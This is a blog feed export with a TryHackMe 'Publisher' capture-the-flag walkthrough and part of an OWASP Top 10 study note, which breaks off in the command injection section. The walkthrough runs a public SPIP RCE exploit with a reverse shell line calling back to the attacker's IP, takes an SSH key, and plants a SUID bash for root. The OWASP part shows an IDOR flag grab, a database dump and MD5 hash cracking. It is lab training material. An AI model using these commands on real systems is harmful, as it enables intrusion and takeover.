        <content type="html"><![CDATA[<p><img src="/../publisher_img/tryhackme-publisher.png" alt="alt text"></p><h1 id="Publisher"><a href="#Publisher" class="headerlink" title="Publisher"></a>Publisher</h1><p>The “Publisher” CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system’s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.</p><p>Machine IP Address: 10.10.175.100</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning"></a>NMAP Scanning</h2><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ sudo nmap -p- -sS --min-rate 5000 --open -T5 -vvv -Pn 10.10.175.100</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT   STATE SERVICE REASON22/tcp open  ssh     syn-ack ttl 6380/tcp open  http    syn-ack ttl 62</code></pre><p>Full NMAP Scanning: </p><ul><li>command used:</li></ul><pre><code class="hljs bash">─$ nmap -A -sC -sV -p22,80 10.10.175.100</code></pre><p>→ output:</p><pre><code class="hljs bash">PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)|   256 0a:4b:b9:b1:77:d2:48:79:<span class="hljs-built_in">fc</span>:2f:8a:3d:64:3a:ad:94 (ECDSA)|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Publisher<span class="hljs-string">&#x27;s Pulse: SPIP Insights &amp; Tips</span><span class="hljs-string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><span class="hljs-string"></span></code></pre><h2 id="Services"><a href="#Services" class="headerlink" title="Services"></a>Services</h2><h3 id="TCP-22-Default-Port-for-ssh"><a href="#TCP-22-Default-Port-for-ssh" class="headerlink" title="TCP 22 (Default Port for ssh)"></a>TCP 22 (Default Port for ssh)</h3><p>-&gt; SSH package version - Might be able to find the OS and version.</p><p>-&gt; SSH key fingerprint - Has the key been re-used somewhere (Another machine? Same machine, just another port&#x2F;service?)</p><p>-&gt; SSH banner - Any text (if at all) before the password prompt (often get legal warnings about connecting to it)</p><ul><li>SSH package version:</li></ul><pre><code class="hljs bash">nc -vn 10.10.175.100 22</code></pre><p>→ output:</p><pre><code class="hljs bash">(UNKNOWN) [10.10.175.100] 22 (ssh) openSSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10</code></pre><p>-&gt; SSH key fingerprint:</p><pre><code class="hljs bash">ssh root@10.10.175.100</code></pre><ul><li>output:</li></ul><pre><code class="hljs bash">The authenticity of host <span class="hljs-string">&#x27;10.10.175.100 (10.10.175.100)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><span class="hljs-string">ED25519 key fingerprint is SHA256:Ndgax/DOZA6JS00F3afY6VbwjVhV2fg5OAMP9TqPAOs.</span><span class="hljs-string">This key is not known by any other names.</span><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? </span></code></pre><h3 id="TCP-80-Default-Port-for-HTTP"><a href="#TCP-80-Default-Port-for-HTTP" class="headerlink" title="TCP 80 (Default Port for HTTP)"></a>TCP 80 (Default Port for HTTP)</h3><ul><li><blockquote><p>Web Server:</p></blockquote></li></ul><pre><code class="hljs bash">curl -i http://10.10.175.100 | <span class="hljs-built_in">head</span> -n 50</code></pre><p>→ output: </p><pre><code class="hljs bash">─$ curl -i http://10.10.175.100 | <span class="hljs-built_in">head</span> -n 50  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  8686  100  8686    0     0  63387      0 --:--:-- --:--:-- --:--:-- 62942HTTP/1.1 200 OKDate: Thu, 18 Jul 2024 08:15:24 GMTServer: Apache/2.4.41 (Ubuntu)Last-Modified: Wed, 20 Dec 2023 19:05:25 GMTETag: <span class="hljs-string">&quot;21ee-60cf5aa5ef7f4&quot;</span>Accept-Ranges: bytesContent-Length: 8686Vary: Accept-EncodingContent-Type: text/html&lt;!DOCTYPE html PUBLIC <span class="hljs-string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="hljs-string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;&lt;html xmlns=<span class="hljs-string">&quot;http://www.w3.org/1999/xhtml&quot;</span>&gt;&lt;<span class="hljs-built_in">head</span>&gt;&lt;title&gt;Publisher<span class="hljs-string">&#x27;s Pulse: SPIP Insights &amp; Tips&lt;/title&gt;</span><span class="hljs-string">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><span class="hljs-string">&lt;link href=&quot;style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</span><span class="hljs-string">&lt;/head&gt;</span><span class="hljs-string">&lt;body&gt;</span><span class="hljs-string">&lt;div id=&quot;header_panel&quot;&gt;</span><span class="hljs-string">  &lt;div id=&quot;header_section&quot;&gt;</span><span class="hljs-string">    &lt;div id=&quot;title_section&quot;&gt;Community Magazine&lt;/div&gt;</span><span class="hljs-string">    &lt;div id=&quot;tagline&quot;&gt;Publish articles, success stories,&lt;/div&gt;</span><span class="hljs-string">    &lt;div id=&quot;tagline&quot;&gt;tutorials and opinions about SPIP&lt;/div&gt;</span><span class="hljs-string">  &lt;/div&gt;</span><span class="hljs-string">&lt;/div&gt;</span><span class="hljs-string">&lt;!-- end of haeder --&gt;</span><span class="hljs-string">&lt;div id=&quot;menu_panel&quot;&gt;</span><span class="hljs-string">  &lt;div id=&quot;menu_section&quot;&gt;</span><span class="hljs-string">    &lt;ul&gt;</span><span class="hljs-string">      &lt;li&gt;&lt;a href=&quot;#&quot; class=&quot;current&quot;&gt;Home&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">      &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Gallery&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">      &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Tutorials&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">      &lt;li&gt;&lt;a href=&quot;#&quot;&gt;Freebies&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">      &lt;li&gt;&lt;a href=&quot;#&quot;&gt;About Us&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">      &lt;li&gt;&lt;a href=&quot;#&quot; class=&quot;last&quot;&gt;Contact Us&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">    &lt;/ul&gt;</span><span class="hljs-string">  &lt;/div&gt;</span><span class="hljs-string">&lt;/div&gt;</span><span class="hljs-string">&lt;!-- end of menu --&gt;</span><span class="hljs-string">&lt;div id=&quot;content&quot;&gt;</span><span class="hljs-string">  &lt;div id=&quot;content_column_one&quot;&gt;</span><span class="hljs-string">    &lt;div class=&quot;column_one_section&quot;&gt;</span><span class="hljs-string">      &lt;h1&gt;Related Blogs&lt;/h1&gt;</span><span class="hljs-string">      &lt;ul&gt;</span><span class="hljs-string">        &lt;li&gt;&lt;a href=&quot;https://blog.spip.net/Rencontre-SPIP-du-8-au-10-septembre-2023.html&quot;&gt;Rencontre SPIP&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">        &lt;li&gt;&lt;a href=&quot;https://blog.spip.net/Mise-a-jour-critique-de-securite-sortie-de-SPIP-4-1-5-SPIP-4-0-8-et-SPIP-3-2-16.html&quot;&gt;Mise à jour critique de sécurité : sortie de SPIP 4.1.5, SPIP 4.0.8 et SPIP 3.2.16&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">        &lt;li&gt;&lt;a href=&quot;https://blog.spip.net/Spip-Luz-Days.html&quot;&gt;Spip Luz Days&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">        &lt;li&gt;&lt;a href=&quot;https://blog.spip.net/?lang=fr&quot;&gt;Gazette de septembre 2023&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">        &lt;li&gt;&lt;a href=&quot;https://blog.spip.net/Gazette-de-Juin-2023.html?lang=fr&quot;&gt;Piratages de SPIP&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string"></span><span class="hljs-string">        &lt;li&gt;&lt;a href=&quot;https://blog.spip.net/Gazette-de-Juin-2023.html?lang=fr&quot;&gt;Nouveaux plugins&lt;/a&gt;&lt;/li&gt;</span><span class="hljs-string">curl: Failed writing body</span></code></pre><h2 id="Directory-Busting"><a href="#Directory-Busting" class="headerlink" title="Directory Busting"></a>Directory Busting</h2><p><strong>Using Gobuster we managed to find a hidden directory:</strong></p><ul><li>command used:</li></ul><pre><code class="hljs bash">$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.175.100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>→ output:</p><pre><code class="hljs bash">$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.175.100/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.175.100/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster <span class="hljs-keyword">in</span> directory enumeration mode===============================================================/images               (Status: 301) [Size: 315] [--&gt; http://10.10.175.100/images/]/spip                 (Status: 301) [Size: 313] [--&gt; http://10.10.175.100/spip/]</code></pre><p>Check &#x2F;spip</p><p><img src="/../publisher_img/1.png" alt="alt text"></p><p>View Page source and we find a version →</p><p><strong>SPIP 4.2.0</strong></p><p><img src="/../publisher_img/2.png" alt="alt text"></p><p><strong>Found this exploit on Exploit-DB -RCE</strong></p><p><a href="https://www.exploit-db.com/exploits/51536">https://www.exploit-db.com/exploits/51536</a></p><p><img src="/../publisher_img/3.png" alt="alt text"><br>Usage</p><pre><code class="hljs bash"><span class="hljs-comment"># Usage: python3 CVE-2023-27372.py http://example.com</span></code></pre><p>Now we are going to take advantage of this exploit and get a interactive shell</p><p><strong>Run a netcat on my machine and on the file with the exploit paste a reverse shell command</strong> </p><ul><li>commands:</li></ul><pre><code class="hljs bash">nc -lvnp 4444</code></pre><p>On another file run the exploit with the reverse shell:</p><pre><code class="hljs bash">└─$ python3 51536.py -u http://10.10.175.100/spip/ -c <span class="hljs-string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.9.2.5/4444 0&gt;&amp;1&quot;&#x27;</span></code></pre><p>Now we check the netcat and we got shell access !! </p><p><img src="/../publisher_img/4.png" alt="alt text"></p><p>Got user flag: </p><pre><code class="hljs bash">ww-data@41c976e507f8:/home/think/spip/spip$ <span class="hljs-built_in">cd</span>  /home<span class="hljs-built_in">cd</span>  /homewww-data@41c976e507f8:/home$ <span class="hljs-built_in">ls</span><span class="hljs-built_in">ls</span>thinkwww-data@41c976e507f8:/home$ <span class="hljs-built_in">cd</span> think   <span class="hljs-built_in">cd</span> thinklwww-data@41c976e507f8:/home/think$ s<span class="hljs-built_in">ls</span>spipuser.txtwww-data@41c976e507f8:/home/think$ <span class="hljs-built_in">cat</span> user.txt<span class="hljs-built_in">cat</span> user.txtfa229046d44eda6a3598c73ad96f4ca5</code></pre><p><strong>FLAG:  fa229046d44eda6a3598c73ad96f4ca5</strong></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>After enumerating other directories we find .ssh and a id_rsa key</p><pre><code class="hljs bash">www-data@41c976e507f8:/home/think$ <span class="hljs-built_in">ls</span> -la<span class="hljs-built_in">ls</span> -latotal 48drwxr-xr-x 8 think    think    4096 Feb 10 21:27 .drwxr-xr-x 1 root     root     4096 Dec  7  2023 ..lrwxrwxrwx 1 root     root        9 Jun 21  2023 .bash_history -&gt; /dev/null-rw-r--r-- 1 think    think     220 Nov 14  2023 .bash_logout-rw-r--r-- 1 think    think    3771 Nov 14  2023 .bashrcdrwx------ 2 think    think    4096 Nov 14  2023 .cachedrwx------ 3 think    think    4096 Dec  8  2023 .configdrwx------ 3 think    think    4096 Feb 10 21:22 .gnupgdrwxrwxr-x 3 think    think    4096 Jan 10  2024 .<span class="hljs-built_in">local</span>-rw-r--r-- 1 think    think     807 Nov 14  2023 .profilelrwxrwxrwx 1 think    think       9 Feb 10 21:27 .python_history -&gt; /dev/nulldrwxr-xr-x 2 think    think    4096 Jan 10  2024 .sshlrwxrwxrwx 1 think    think       9 Feb 10 21:27 .viminfo -&gt; /dev/nulldrwxr-x--- 5 www-data www-data 4096 Dec 20  2023 spip-rw-r--r-- 1 root     root       35 Feb 10 21:20 user.txtwww-data@41c976e507f8:/home/think$ <span class="hljs-built_in">cat</span> .ssh <span class="hljs-built_in">cat</span> .ssh<span class="hljs-built_in">cat</span>: .ssh: Is a directorywww-data@41c976e507f8:/home/think$ <span class="hljs-built_in">cd</span> .ssh<span class="hljs-built_in">cd</span> .sshlwww-data@41c976e507f8:/home/think/.ssh$ s<span class="hljs-built_in">ls</span>authorized_keysid_rsaid_rsa.pub</code></pre><p>We already have a user <code>think</code> so let’s try ssh with the key and user but first we need to change permissions to id_rsa:</p><pre><code class="hljs bash"><span class="hljs-built_in">chmod</span> 600 id_rsa</code></pre><ul><li>command used:</li></ul><pre><code class="hljs bash">└─$ ssh think@10.10.175.100 -i id_rsa</code></pre><p>Tried to check for files with sudo permissions with <code>sudo -l</code> but it asks the password of think</p><p>Check for binaries with SUID permission:</p><ul><li>command used:</li></ul><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</code></pre><p>Something that catches our attention is <strong>&#x2F;usr&#x2F;sbin&#x2F;run_container:</strong></p><p><img src="/../publisher_img/5.png" alt="alt text"></p><p>Our user’s login shell is set as <strong>&#x2F;usr&#x2F;sbin&#x2F;ash</strong></p><pre><code class="hljs bash">think@publisher:~$ <span class="hljs-built_in">cat</span> /etc/passwd</code></pre><pre><code class="hljs bash">think:x:1000:1000:,,,:/home/think:/usr/sbin/ash</code></pre><p>The taks hint was <code>Look to the App Armor by it’s profile</code></p><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /etc<span class="hljs-built_in">cd</span> apparmor.d</code></pre><p><img src="/../publisher_img/6.png" alt="alt text"></p><p> See that &#x2F;bin&#x2F;bash is running as root, so let’s switch to &#x2F;dev&#x2F;shm copy &#x2F;bin&#x2F;bash to get a bash shell and hence access to &#x2F;opt.</p><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /dev/shm<span class="hljs-built_in">cp</span> /bin/bash ../bash -p</code></pre><p>We tried to read the file <code>run_container</code> but it seems encoded:</p><p><img src="/../publisher_img/7.png" alt="alt text"></p><p>In this case we found an alternative to read the file named <code>strings</code> :</p><pre><code class="hljs bash">strings /usr/sbin/run_container</code></pre><pre><code class="hljs bash">/lib64/ld-linux-x86-64.so.2libc.so.6__stack_chk_failexecve__cxa_finalize__libc_start_mainGLIBC_2.2.5GLIBC_2.4_ITM_deregisterTMCloneTable__gmon_start___ITM_registerTMCloneTableu+UH[]A\A]A^A_/bin/bash/opt/run_container.sh:*3$<span class="hljs-string">&quot;</span><span class="hljs-string">GCC: (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0</span><span class="hljs-string">crtstuff.c</span><span class="hljs-string">deregister_tm_clones</span><span class="hljs-string">__do_global_dtors_aux</span><span class="hljs-string">completed.8061</span><span class="hljs-string">__do_global_dtors_aux_fini_array_entry</span><span class="hljs-string">frame_dummy</span><span class="hljs-string">__frame_dummy_init_array_entry</span><span class="hljs-string">run_container.c</span><span class="hljs-string">__FRAME_END__</span><span class="hljs-string">__init_array_end</span><span class="hljs-string">_DYNAMIC</span><span class="hljs-string">__init_array_start</span><span class="hljs-string">__GNU_EH_FRAME_HDR</span><span class="hljs-string">_GLOBAL_OFFSET_TABLE_</span><span class="hljs-string">__libc_csu_fini</span><span class="hljs-string">_ITM_deregisterTMCloneTable</span><span class="hljs-string">_edata</span><span class="hljs-string">__stack_chk_fail@@GLIBC_2.4</span><span class="hljs-string">__libc_start_main@@GLIBC_2.2.5</span><span class="hljs-string">execve@@GLIBC_2.2.5</span><span class="hljs-string">__data_start</span><span class="hljs-string">__gmon_start__</span><span class="hljs-string">__dso_handle</span><span class="hljs-string">_IO_stdin_used</span><span class="hljs-string">__libc_csu_init</span><span class="hljs-string">__bss_start</span><span class="hljs-string">main</span><span class="hljs-string">__TMC_END__</span><span class="hljs-string">_ITM_registerTMCloneTable</span><span class="hljs-string">__cxa_finalize@@GLIBC_2.2.5</span><span class="hljs-string">.symtab</span><span class="hljs-string">.strtab</span><span class="hljs-string">.shstrtab</span><span class="hljs-string">.interp</span><span class="hljs-string">.note.gnu.property</span><span class="hljs-string">.note.gnu.build-id</span><span class="hljs-string">.note.ABI-tag</span><span class="hljs-string">.gnu.hash</span><span class="hljs-string">.dynsym</span><span class="hljs-string">.dynstr</span><span class="hljs-string">.gnu.version</span><span class="hljs-string">.gnu.version_r</span><span class="hljs-string">.rela.dyn</span><span class="hljs-string">.rela.plt</span><span class="hljs-string">.init</span><span class="hljs-string">.plt.got</span><span class="hljs-string">.plt.sec</span><span class="hljs-string">.text</span><span class="hljs-string">.fini</span><span class="hljs-string">.rodata</span><span class="hljs-string">.eh_frame_hdr</span><span class="hljs-string">.eh_frame</span><span class="hljs-string">.init_array</span><span class="hljs-string">.fini_array</span><span class="hljs-string">.dynamic</span><span class="hljs-string">.data</span><span class="hljs-string">.bss</span><span class="hljs-string">.comment</span></code></pre><p>The binary calls &#x2F;bin&#x2F;bash which then calls &#x2F;opt&#x2F;run_container.sh so let’s check the script permissions maybe we can overwrite it:</p><p><img src="/../publisher_img/8.png" alt="alt text"></p><p><img src="/../publisher_img/9.png" alt="alt text"></p><p>The script has open permissions so let’s edit it:</p><p><img src="/../publisher_img/10.png" alt="alt text"></p><p>We’re copying <code>/bin/bash</code> to <code>/tmp/default</code> with root privileges, setting the <strong>+s</strong> permission to execute it with owner privileges, then executing to gain root access.</p><pre><code class="hljs bash">hink@publisher:/tmp$ ./default -pdefault-5.0<span class="hljs-comment"># whoami</span>root</code></pre><p>Now get Flag:</p><p><img src="/../publisher_img/11.png" alt="alt text"></p><p>FLAG: 3a4225cc9e85709adda6ef55d6a4f2ca</p>]]></content>
      
      
      
        <tags>
            
            <tag> TryHackMe </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OWASP TOP 10</title>
      <link href="/2024/07/16/OWASP-Top-10/"/>
      <url>/2024/07/16/OWASP-Top-10/</url>
      
        <content type="html"><![CDATA[<p><img src="/../owasp_img/owasp-logo.png" alt="alt text"></p><h1 id="OWASP-TOP-10"><a href="#OWASP-TOP-10" class="headerlink" title="OWASP TOP 10"></a>OWASP TOP 10</h1><pre><code class="hljs plaintext">1. Broken Access Control2. Cryptographic Failures3. Injection4. Insecure Design5. Security Misconfiguration6. Vulnerable and Outdated Components7. Identification and Authentication Failures8. Software and Data Integrity Failures9. Security Logging &amp; Monitoring Failures10. Server-Side Request Forgery (SSRF)</code></pre><h1 id="Broken-Access-Control"><a href="#Broken-Access-Control" class="headerlink" title="Broken Access Control"></a>Broken Access Control</h1><p>Websites have pages that are protected from regular visitors. For example, only the site’s admin user should be able to access a page to manage other users. If a website visitor can access protected pages they are not meant to see, then the access controls are broken.</p><p>A regular visitor being able to access protected pages can lead to the following:</p><pre><code class="hljs plaintext">- Being able to view sensitive information from other users- Accessing unauthorized functionality</code></pre><p><em>Simply put, broken access control allows attackers to bypass authorisation, allowing them to view sensitive data or perform tasks they aren’t supposed to.</em></p><h2 id="Broken-Access-Control-IDOR-Challenge"><a href="#Broken-Access-Control-IDOR-Challenge" class="headerlink" title="Broken Access Control (IDOR Challenge)"></a>Broken Access Control (IDOR Challenge)</h2><h3 id="Insecure-Direct-Object-Reference"><a href="#Insecure-Direct-Object-Reference" class="headerlink" title="Insecure Direct Object Reference"></a>Insecure Direct Object Reference</h3><p>IDOR or Insecure Direct Object Reference refers to an access control vulnerability where you can access resources you wouldn’t ordinarily be able to see. This occurs when the programmer exposes a Direct Object Reference, which is just an identifier that refers to specific objects within the server. By object, we could mean a file, a user, a bank account in a banking application, or anything really.</p><h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><p>For example, let’s say we’re logging into our bank account, and after correctly authenticating ourselves, we get taken to a URL like this <a href="https://bank.thm/account?id=111111">https://bank.thm/account?id=111111</a>. </p><p>On that page, we can see all our important bank details, and a user would do whatever they need to do and move along their way, thinking nothing is wrong.</p><p><img src="/../owasp_img/1.png" alt="alt text"></p><p>There is, however, a potentially huge problem here, anyone may be able to change the id parameter to something else like 222222, and if the site is incorrectly configured, then he would have access to someone else’s bank information.</p><p><img src="/../owasp_img/2.png" alt="alt text"></p><p>The application exposes a direct object reference through the <code>id</code> parameter in the URL, which points to specific accounts. </p><p>Since the application isn’t checking if the logged-in user owns the referenced account, an attacker can get sensitive information from other users because of the IDOR vulnerability. </p><p>Notice that direct object references aren’t the problem, but rather that the application doesn’t validate if the logged-in user should have access to the requested account.</p><p>Task:</p><p><img src="/../owasp_img/3.png" alt="alt text"></p><p>Logged in:</p><p><img src="/../owasp_img/4.png" alt="alt text"><br>Change the id to 0 and get flag</p><p><img src="/../owasp_img/5.png" alt="alt text"></p><p>flag{fivefourthree}</p><h1 id="Cryptographic-Failures"><a href="#Cryptographic-Failures" class="headerlink" title="Cryptographic Failures"></a>Cryptographic Failures</h1><p>Cryptographic Failures</p><p>A cryptographic failure refers to any vulnerability arising from the misuse (or lack of use) of cryptographic algorithms for protecting sensitive information. Web applications require cryptography to provide confidentiality for their users at many levels. </p><p>Take, for example, a secure email application:</p><ul><li>When you are accessing your email account using your browser, you want to be sure that the communications between you and the server are encrypted. That way, any eavesdropper trying to capture your network packets won’t be able to recover the content of your email addresses. When we encrypt the network traffic between the client and server, we usually refer to this as encrypting data in transit.</li><li>Since your emails are stored in some server managed by your provider, it is also desirable that the email provider can’t read their client’s emails. To this end, your emails might also be encrypted when stored on the servers. This is referred to as encrypting data at rest.</li></ul><p>Cryptographic failures often end up in web apps accidentally divulging sensitive data. This is often data directly linked to customers (e.g. names, dates of birth, financial information), but it could also be more technical information, such as usernames and passwords. </p><p>At more complex levels, taking advantage of some cryptographic failures often involves techniques such as “Man in The Middle Attacks”, whereby the attacker would force user connections through a device they control. Then, they would take advantage of weak encryption on any transmitted data to access the intercepted information (if the data is even encrypted in the first place). Of course, many examples are much simpler, and vulnerabilities can be found in web apps that can be exploited without advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the web server itself.</p><h2 id="Cryptographic-Failures-Supporting-Material-1"><a href="#Cryptographic-Failures-Supporting-Material-1" class="headerlink" title="Cryptographic Failures (Supporting Material 1)"></a>Cryptographic Failures (Supporting Material 1)</h2><p>The most common way to store a large amount of data in a format easily accessible from many locations is in a database. This is perfect for something like a web application, as many users may interact with the website at any time. Database engines usually follow the Structured Query Language (SQL) syntax.</p><p>In a production environment, it is common to see databases set up on dedicated servers running a database service such as MySQL or MariaDB; however, databases can also be stored as files. These are referred to as “flat-file” databases, as they are stored as a single file on the computer. This is much easier than setting up an entire database server and could potentially be seen in smaller web applications. Accessing a database server is outwith the scope of today’s task, so let’s focus instead on flat-file databases.</p><p>As mentioned previously, flat-file databases are stored as a file on the disk of a computer. Usually, this would not be a problem for a web app, but what happens if the database is stored underneath the root directory of the website (i.e. one of the files accessible to the user connecting to the website)? Well, we can download and query it on our own machine, with full access to everything in the database. Sensitive Data Exposure, indeed!</p><p>The most common (and simplest) format of a flat-file database is an SQLite database. These can be interacted with in most programming languages and have a dedicated client for querying them on the command line. This client is called sqlite3 and is installed on many Linux distributions by default.</p><h3 id="Managed-to-download-a-database"><a href="#Managed-to-download-a-database" class="headerlink" title="Managed to download a database:"></a>Managed to download a database:</h3><pre><code class="hljs bash">user@linux$ <span class="hljs-built_in">ls</span> -l -rw-r--r-- 1 user user 8192 Feb  2 20:33 example.db                                                                                                                                                              user@linux$ file example.db example.db: SQLite 3.x database, last written using SQLite version 3039002, file counter 1, database pages 2, cookie 0x1, schema 4, UTF-8, version-valid-for 1</code></pre><p>We can see that there is an SQLite database in the current folder.</p><h3 id="Access-the-database"><a href="#Access-the-database" class="headerlink" title="Access the database:"></a>Access the database:</h3><p>To access it, we use sqlite3 <database-name>:</p><pre><code class="hljs bash">user@linux$ sqlite3 example.db                     SQLite version 3.39.2 2022-07-21 15:24:47Enter <span class="hljs-string">&quot;.help&quot;</span> <span class="hljs-keyword">for</span> usage hints.sqlite&gt;</code></pre><p>From here, we can see the tables in the database by using the <code>.tables</code> command:</p><pre><code class="hljs bash">user@linux$ sqlite3 example.db                     SQLite version 3.39.2 2022-07-21 15:24:47Enter <span class="hljs-string">&quot;.help&quot;</span> <span class="hljs-keyword">for</span> usage hints.sqlite&gt; .tablescustomers</code></pre><p>At this point, we can dump all the data from the table, but we won’t necessarily know what each column means unless we look at the table information. </p><p>First, let’s use <code>PRAGMA table_info(customers);</code> to see the table information. Then we’ll use <code>SELECT * FROM customers;</code> to dump the information from the table:</p><pre><code class="hljs bash">sqlite&gt; PRAGMA table_info(customers);0|cudtID|INT|1||11|custName|TEXT|1||02|creditCard|TEXT|0||03|password|TEXT|1||0sqlite&gt; SELECT * FROM customers;0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf991|John Walters|4671 5376 3366 8125|fef08f333cc53594c8097eba1f35726a2|Lena Abdul|4353 4722 6349 6685|b55ab2470f160c331a99b8d8a1946b193|Andrew Miller|4059 8824 0198 5596|bc7b657bd56e4386e3397ca86e378f704|Keith Wayman|4972 1604 3381 8885|12e7a36c0710571b3d827992f4cfe6795|Annett Scholz|5400 1617 6508 1166|e2795fc96af3f4d6288906a90a52a47f</code></pre><p>We can see from the table information that there are four columns: <code>custID</code>, <code>custName</code>, <code>creditCard</code> and <code>password</code>. You may notice that this matches up with the results. Take the first row:</p><p><code>0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99</code></p><p>We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash (5f4dcc3b5aa765d61d8327deb882cf99).</p><h2 id="Cryptographic-Failures-Supporting-Material-2"><a href="#Cryptographic-Failures-Supporting-Material-2" class="headerlink" title="Cryptographic Failures (Supporting Material 2)"></a>Cryptographic Failures (Supporting Material 2)</h2><h3 id="Hash-Cracking"><a href="#Hash-Cracking" class="headerlink" title="Hash Cracking"></a>Hash Cracking</h3><p>For hash cracking use :</p><p><a href="https://crackstation.net/">https://crackstation.net/</a></p><p><img src="/../owasp_img/6.png" alt="alt text"></p><h2 id="Challange"><a href="#Challange" class="headerlink" title="Challange"></a>Challange</h2><p>Find hidden directories with gobuster:</p><pre><code class="hljs bash">└─$ gobuster <span class="hljs-built_in">dir</span> -u http://10.10.239.227:81/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt</code></pre><p>Found <code>/assets</code> </p><p><img src="/../owasp_img/7.png" alt="alt text"></p><p>Download webapp.db</p><pre><code class="hljs bash">sqlite&gt; SELECT * FROM <span class="hljs-built_in">users</span>;4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|123023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|14e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0sqlite&gt;</code></pre><p>Cracking admin’s pass with <code>crackstation</code> :</p><pre><code class="hljs bash">6eea9b7ef19179a06954edd0f6c05cebmd5qwertyuiop</code></pre><p>Pass: <code>qwertyuiop</code></p><p><img src="/../owasp_img/8.png" alt="alt text"></p><h1 id="Injection"><a href="#Injection" class="headerlink" title="Injection"></a>Injection</h1><p><code>SQL Injection</code>: This occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries to manipulate the outcome of such queries. </p><p>This could potentially allow the attacker to access, modify and delete information in a database when this input is passed into database queries. This would mean an attacker could steal sensitive information such as personal details and credentials.</p><p><code>Command Injection</code>:This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary system commands on application servers, potentially allowing them to access users’ systems.</p><p>The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:</p><ul><li>Using an allow list : when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.</li><li>Stripping input: If the input contains dangerous characters, these are removed before processing.</li></ul><h2 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h2><p>Command Injection occurs when server-side code (like PHP) in a web application makes a call to a function that interacts with the server’s console directly. An injection web vulnerability allows an attacker to take advantage of that call to execute operating system commands arbitrarily on the server. The possibilities for the attacker from here are endless: they could list files, read their contents, run some basic commands to do some recon on the server or whatever they wanted, just as if they were sitting in front of the server and issuing commands directly into the command line. </p><h3 